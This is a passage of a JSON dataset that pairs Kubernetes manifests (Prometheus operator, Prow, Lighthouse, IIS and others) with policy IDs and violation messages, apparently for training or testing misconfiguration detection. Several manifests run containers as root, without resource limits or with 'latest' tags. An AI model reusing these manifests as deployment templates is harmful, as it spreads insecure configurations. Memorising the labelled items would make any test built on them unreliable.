secretName: prometheus-operator-user-workload-tls\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"prometheus-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "9908",
    "manifest_path": "data/manifests/the_stack_sample/sample_3810.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: controller\n    app.kubernetes.io/name: prometheus-operator\n    app.kubernetes.io/part-of: openshift-monitoring\n    app.kubernetes.io/version: 0.47.0\n  name: prometheus-operator\n  namespace: openshift-user-workload-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: controller\n      app.kubernetes.io/name: prometheus-operator\n      app.kubernetes.io/part-of: openshift-monitoring\n  template:\n    metadata:\n      annotations:\n        target.workload.openshift.io/management: '{\"effect\": \"PreferredDuringScheduling\"}'\n      labels:\n        app.kubernetes.io/component: controller\n        app.kubernetes.io/name: prometheus-operator\n        app.kubernetes.io/part-of: openshift-monitoring\n        app.kubernetes.io/version: 0.47.0\n    spec:\n      containers:\n      - args:\n        - --prometheus-config-reloader=quay.io/prometheus-operator/prometheus-config-reloader:v0.47.0\n        - --deny-namespaces=openshift-monitoring\n        - --prometheus-instance-namespaces=openshift-user-workload-monitoring\n        - --alertmanager-instance-namespaces=openshift-user-workload-monitoring\n        - --thanos-ruler-instance-namespaces=openshift-user-workload-monitoring\n        - --config-reloader-cpu-limit=0\n        - --config-reloader-memory-limit=0\n        image: quay.io/prometheus-operator/prometheus-operator:v0.47.0\n        name: prometheus-operator\n        ports:\n        - containerPort: 8080\n          name: http\n        resources:\n          requests:\n            cpu: 1m\n            memory: 17Mi\n        securityContext: {}\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8080/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/brancz/kube-rbac-proxy:v0.8.0\n        name: kube-rbac-proxy\n        ports:\n        - containerPort: 8443\n          name: https\n        resources:\n          requests:\n            cpu: 1m\n            memory: 10Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: prometheus-operator-user-workload-tls\n          readOnly: false\n      securityContext: {}\n      serviceAccountName: prometheus-operator\n      volumes:\n      - name: prometheus-operator-user-workload-tls\n        secret:\n          secretName: prometheus-operator-user-workload-tls\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"kube-rbac-proxy\" has memory limit 0"
  },
  {
    "id": "9909",
    "manifest_path": "data/manifests/the_stack_sample/sample_3810.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: controller\n    app.kubernetes.io/name: prometheus-operator\n    app.kubernetes.io/part-of: openshift-monitoring\n    app.kubernetes.io/version: 0.47.0\n  name: prometheus-operator\n  namespace: openshift-user-workload-monitoring\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: controller\n      app.kubernetes.io/name: prometheus-operator\n      app.kubernetes.io/part-of: openshift-monitoring\n  template:\n    metadata:\n      annotations:\n        target.workload.openshift.io/management: '{\"effect\": \"PreferredDuringScheduling\"}'\n      labels:\n        app.kubernetes.io/component: controller\n        app.kubernetes.io/name: prometheus-operator\n        app.kubernetes.io/part-of: openshift-monitoring\n        app.kubernetes.io/version: 0.47.0\n    spec:\n      containers:\n      - args:\n        - --prometheus-config-reloader=quay.io/prometheus-operator/prometheus-config-reloader:v0.47.0\n        - --deny-namespaces=openshift-monitoring\n        - --prometheus-instance-namespaces=openshift-user-workload-monitoring\n        - --alertmanager-instance-namespaces=openshift-user-workload-monitoring\n        - --thanos-ruler-instance-namespaces=openshift-user-workload-monitoring\n        - --config-reloader-cpu-limit=0\n        - --config-reloader-memory-limit=0\n        image: quay.io/prometheus-operator/prometheus-operator:v0.47.0\n        name: prometheus-operator\n        ports:\n        - containerPort: 8080\n          name: http\n        resources:\n          requests:\n            cpu: 1m\n            memory: 17Mi\n        securityContext: {}\n      - args:\n        - --logtostderr\n        - --secure-listen-address=:8443\n        - --tls-cipher-suites=TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305\n        - --upstream=http://127.0.0.1:8080/\n        - --tls-cert-file=/etc/tls/private/tls.crt\n        - --tls-private-key-file=/etc/tls/private/tls.key\n        image: quay.io/brancz/kube-rbac-proxy:v0.8.0\n        name: kube-rbac-proxy\n        ports:\n        - containerPort: 8443\n          name: https\n        resources:\n          requests:\n            cpu: 1m\n            memory: 10Mi\n        securityContext: {}\n        volumeMounts:\n        - mountPath: /etc/tls/private\n          name: prometheus-operator-user-workload-tls\n          readOnly: false\n      securityContext: {}\n      serviceAccountName: prometheus-operator\n      volumes:\n      - name: prometheus-operator-user-workload-tls\n        secret:\n          secretName: prometheus-operator-user-workload-tls\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"prometheus-operator\" has memory limit 0"
  },
  {
    "id": "9910",
    "manifest_path": "data/manifests/the_stack_sample/sample_3811.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20220316-7c2afcc68a\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/kubeconfig\n        ports:\n        - name: metrics\n          containerPort: 9090\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-build-clusters-kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"prow-controller-manager\" not found"
  },
  {
    "id": "9911",
    "manifest_path": "data/manifests/the_stack_sample/sample_3811.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20220316-7c2afcc68a\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/kubeconfig\n        ports:\n        - name: metrics\n          containerPort: 9090\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-build-clusters-kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"prow-controller-manager\" is not set to runAsNonRoot"
  },
  {
    "id": "9912",
    "manifest_path": "data/manifests/the_stack_sample/sample_3811.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20220316-7c2afcc68a\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/kubeconfig\n        ports:\n        - name: metrics\n          containerPort: 9090\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-build-clusters-kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"prow-controller-manager\" has cpu request 0"
  },
  {
    "id": "9913",
    "manifest_path": "data/manifests/the_stack_sample/sample_3811.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: prow-controller-manager\n  labels:\n    app: prow-controller-manager\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: prow-controller-manager\n  template:\n    metadata:\n      labels:\n        app: prow-controller-manager\n    spec:\n      serviceAccountName: prow-controller-manager\n      containers:\n      - name: prow-controller-manager\n        image: gcr.io/k8s-prow/prow-controller-manager:v20220316-7c2afcc68a\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --enable-controller=plank\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/kubeconfig\n        ports:\n        - name: metrics\n          containerPort: 9090\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - mountPath: /etc/kubeconfig\n          name: kubeconfig\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n      volumes:\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-build-clusters-kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"prow-controller-manager\" has memory limit 0"
  },
  {
    "id": "9914",
    "manifest_path": "data/manifests/the_stack_sample/sample_3812.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-tekton-controller\n  labels:\n    chart: lighthouse-1.3.0\n    app: lighthouse-tekton-controller\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-tekton-controller\n  template:\n    metadata:\n      labels:\n        app: lighthouse-tekton-controller\n      annotations:\n        jenkins-x.io/hash: beaad4cded88f5572b6a079082f39d0b00e7b0fc527a18ceb52857330f6d746a\n    spec:\n      serviceAccountName: lighthouse-tekton-controller\n      containers:\n      - name: lighthouse-tekton-controller\n        image: ghcr.io/jenkins-x/lighthouse-tekton-controller:1.3.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        - --dashboard-url=http://dashboard-jx.34.69.81.209.nip.io\n        - --dashboard-template=namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun\n          }}\n        ports:\n        - name: metrics\n          containerPort: 8080\n        env:\n        - name: LOGRUS_FORMAT\n          value: stackdriver\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.3.0\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 60d2f020b3003672ecbc8c9abd2f3cf20344fee2\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n      affinity: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"lighthouse-tekton-controller\" does not have a read-only root file system"
  },
  {
    "id": "9915",
    "manifest_path": "data/manifests/the_stack_sample/sample_3812.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-tekton-controller\n  labels:\n    chart: lighthouse-1.3.0\n    app: lighthouse-tekton-controller\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-tekton-controller\n  template:\n    metadata:\n      labels:\n        app: lighthouse-tekton-controller\n      annotations:\n        jenkins-x.io/hash: beaad4cded88f5572b6a079082f39d0b00e7b0fc527a18ceb52857330f6d746a\n    spec:\n      serviceAccountName: lighthouse-tekton-controller\n      containers:\n      - name: lighthouse-tekton-controller\n        image: ghcr.io/jenkins-x/lighthouse-tekton-controller:1.3.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        - --dashboard-url=http://dashboard-jx.34.69.81.209.nip.io\n        - --dashboard-template=namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun\n          }}\n        ports:\n        - name: metrics\n          containerPort: 8080\n        env:\n        - name: LOGRUS_FORMAT\n          value: stackdriver\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.3.0\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 60d2f020b3003672ecbc8c9abd2f3cf20344fee2\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n      affinity: {}\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"lighthouse-tekton-controller\" not found"
  },
  {
    "id": "9916",
    "manifest_path": "data/manifests/the_stack_sample/sample_3812.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-tekton-controller\n  labels:\n    chart: lighthouse-1.3.0\n    app: lighthouse-tekton-controller\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-tekton-controller\n  template:\n    metadata:\n      labels:\n        app: lighthouse-tekton-controller\n      annotations:\n        jenkins-x.io/hash: beaad4cded88f5572b6a079082f39d0b00e7b0fc527a18ceb52857330f6d746a\n    spec:\n      serviceAccountName: lighthouse-tekton-controller\n      containers:\n      - name: lighthouse-tekton-controller\n        image: ghcr.io/jenkins-x/lighthouse-tekton-controller:1.3.0\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        - --dashboard-url=http://dashboard-jx.34.69.81.209.nip.io\n        - --dashboard-template=namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun\n          }}\n        ports:\n        - name: metrics\n          containerPort: 8080\n        env:\n        - name: LOGRUS_FORMAT\n          value: stackdriver\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.3.0\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 60d2f020b3003672ecbc8c9abd2f3cf20344fee2\n        envFrom:\n        - secretRef:\n            name: jx-boot-job-env-vars\n            optional: true\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n      affinity: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"lighthouse-tekton-controller\" is not set to runAsNonRoot"
  },
  {
    "id": "9917",
    "manifest_path": "data/manifests/the_stack_sample/sample_3813.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: processor\n  namespace: <PROJECT>\n  labels:\n    app: processor\nspec:\n  ports:\n  - port: 80\n    targetPort: 80\n    name: http\n  selector:\n    app: processor\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:processor])"
  },
  {
    "id": "9918",
    "manifest_path": "data/manifests/the_stack_sample/sample_3814.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: overprovisioning-highmem\n  namespace: overprovisioning\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      run: overprovisioning-highmem\n  template:\n    metadata:\n      labels:\n        run: overprovisioning-highmem\n    spec:\n      containers:\n      - image: k8s.gcr.io/pause\n        name: reserve-resources\n        resources:\n          requests:\n            cpu: 1\n            memory: 1Gi\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"reserve-resources\" is using an invalid container image, \"k8s.gcr.io/pause\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9919",
    "manifest_path": "data/manifests/the_stack_sample/sample_3814.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: overprovisioning-highmem\n  namespace: overprovisioning\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      run: overprovisioning-highmem\n  template:\n    metadata:\n      labels:\n        run: overprovisioning-highmem\n    spec:\n      containers:\n      - image: k8s.gcr.io/pause\n        name: reserve-resources\n        resources:\n          requests:\n            cpu: 1\n            memory: 1Gi\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9920",
    "manifest_path": "data/manifests/the_stack_sample/sample_3814.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: overprovisioning-highmem\n  namespace: overprovisioning\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      run: overprovisioning-highmem\n  template:\n    metadata:\n      labels:\n        run: overprovisioning-highmem\n    spec:\n      containers:\n      - image: k8s.gcr.io/pause\n        name: reserve-resources\n        resources:\n          requests:\n            cpu: 1\n            memory: 1Gi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"reserve-resources\" does not have a read-only root file system"
  },
  {
    "id": "9921",
    "manifest_path": "data/manifests/the_stack_sample/sample_3814.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: overprovisioning-highmem\n  namespace: overprovisioning\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      run: overprovisioning-highmem\n  template:\n    metadata:\n      labels:\n        run: overprovisioning-highmem\n    spec:\n      containers:\n      - image: k8s.gcr.io/pause\n        name: reserve-resources\n        resources:\n          requests:\n            cpu: 1\n            memory: 1Gi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"reserve-resources\" is not set to runAsNonRoot"
  },
  {
    "id": "9922",
    "manifest_path": "data/manifests/the_stack_sample/sample_3814.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: overprovisioning-highmem\n  namespace: overprovisioning\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      run: overprovisioning-highmem\n  template:\n    metadata:\n      labels:\n        run: overprovisioning-highmem\n    spec:\n      containers:\n      - image: k8s.gcr.io/pause\n        name: reserve-resources\n        resources:\n          requests:\n            cpu: 1\n            memory: 1Gi\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"reserve-resources\" has memory limit 0"
  },
  {
    "id": "9923",
    "manifest_path": "data/manifests/the_stack_sample/sample_3815.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: report-parser\n  name: report-parser\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: report-parser\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: report-parser\n    spec:\n      containers:\n      - image: kiln/report-parser:git-latest\n        imagePullPolicy: Always\n        name: report-parser\n        env:\n        - name: KAFKA_BOOTSTRAP_TLS\n          value: kafka-headless.default.svc.cluster.local:9093\n        - name: DISABLE_KAFKA_DOMAIN_VALIDATION\n          value: 'true'\n        - name: RUST_LOG\n          value: info\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /tls\n          name: kafka-ca-vol\n      volumes:\n      - name: kafka-ca-vol\n        secret:\n          secretName: kafka-ca\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"report-parser\" does not have a read-only root file system"
  },
  {
    "id": "9924",
    "manifest_path": "data/manifests/the_stack_sample/sample_3815.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: report-parser\n  name: report-parser\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: report-parser\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: report-parser\n    spec:\n      containers:\n      - image: kiln/report-parser:git-latest\n        imagePullPolicy: Always\n        name: report-parser\n        env:\n        - name: KAFKA_BOOTSTRAP_TLS\n          value: kafka-headless.default.svc.cluster.local:9093\n        - name: DISABLE_KAFKA_DOMAIN_VALIDATION\n          value: 'true'\n        - name: RUST_LOG\n          value: info\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /tls\n          name: kafka-ca-vol\n      volumes:\n      - name: kafka-ca-vol\n        secret:\n          secretName: kafka-ca\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"report-parser\" is not set to runAsNonRoot"
  },
  {
    "id": "9925",
    "manifest_path": "data/manifests/the_stack_sample/sample_3815.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: report-parser\n  name: report-parser\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: report-parser\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: report-parser\n    spec:\n      containers:\n      - image: kiln/report-parser:git-latest\n        imagePullPolicy: Always\n        name: report-parser\n        env:\n        - name: KAFKA_BOOTSTRAP_TLS\n          value: kafka-headless.default.svc.cluster.local:9093\n        - name: DISABLE_KAFKA_DOMAIN_VALIDATION\n          value: 'true'\n        - name: RUST_LOG\n          value: info\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /tls\n          name: kafka-ca-vol\n      volumes:\n      - name: kafka-ca-vol\n        secret:\n          secretName: kafka-ca\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"report-parser\" has cpu request 0"
  },
  {
    "id": "9926",
    "manifest_path": "data/manifests/the_stack_sample/sample_3815.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/name: report-parser\n  name: report-parser\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app.kubernetes.io/name: report-parser\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/name: report-parser\n    spec:\n      containers:\n      - image: kiln/report-parser:git-latest\n        imagePullPolicy: Always\n        name: report-parser\n        env:\n        - name: KAFKA_BOOTSTRAP_TLS\n          value: kafka-headless.default.svc.cluster.local:9093\n        - name: DISABLE_KAFKA_DOMAIN_VALIDATION\n          value: 'true'\n        - name: RUST_LOG\n          value: info\n        ports:\n        - containerPort: 8080\n        volumeMounts:\n        - mountPath: /tls\n          name: kafka-ca-vol\n      volumes:\n      - name: kafka-ca-vol\n        secret:\n          secretName: kafka-ca\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"report-parser\" has memory limit 0"
  },
  {
    "id": "9927",
    "manifest_path": "data/manifests/the_stack_sample/sample_3816.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  namespace: saas-provider-backend\n  name: saas-provider-backend-service\n  annotations:\n    service.beta.kubernetes.io/aws-load-balancer-type: nlb\n    service.beta.kubernetes.io/aws-load-balancer-ssl-cert: arn:aws:acm:us-east-2:427398298435:certificate/d549015f-a332-4644-99c7-642c1a244491\n    service.beta.kubernetes.io/aws-load-balancer-backend-protocol: http, https\n    service.beta.kubernetes.io/aws-load-balancer-ssl-negotiation-policy: ELBSecurityPolicy-TLS-1-2-2017-01\n    external-dns.alpha.kubernetes.io/hostname: tenant-api.saas-provider.cloud.\n",
    "policy_id": "dangling-service",
    "violation_text": "service has no selector specified"
  },
  {
    "id": "9928",
    "manifest_path": "data/manifests/the_stack_sample/sample_3819.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: covid19\nspec:\n  selector:\n    app: covid19\n  type: NodePort\n  ports:\n  - name: httpalt\n    port: 8050\n    targetPort: 8050\n    nodePort: 30851\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:covid19])"
  },
  {
    "id": "9929",
    "manifest_path": "data/manifests/the_stack_sample/sample_3823.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: iis3\n  namespace: default\n  labels:\n    name: iis3\n    os: windows\nspec:\n  containers:\n  - image: microsoft/iis:latest\n    name: iis3\n    ports:\n    - containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"iis3\" is using an invalid container image, \"microsoft/iis:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9930",
    "manifest_path": "data/manifests/the_stack_sample/sample_3823.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: iis3\n  namespace: default\n  labels:\n    name: iis3\n    os: windows\nspec:\n  containers:\n  - image: microsoft/iis:latest\n    name: iis3\n    ports:\n    - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"iis3\" does not have a read-only root file system"
  },
  {
    "id": "9931",
    "manifest_path": "data/manifests/the_stack_sample/sample_3823.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: iis3\n  namespace: default\n  labels:\n    name: iis3\n    os: windows\nspec:\n  containers:\n  - image: microsoft/iis:latest\n    name: iis3\n    ports:\n    - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"iis3\" is not set to runAsNonRoot"
  },
  {
    "id": "9932",
    "manifest_path": "data/manifests/the_stack_sample/sample_3823.yaml",
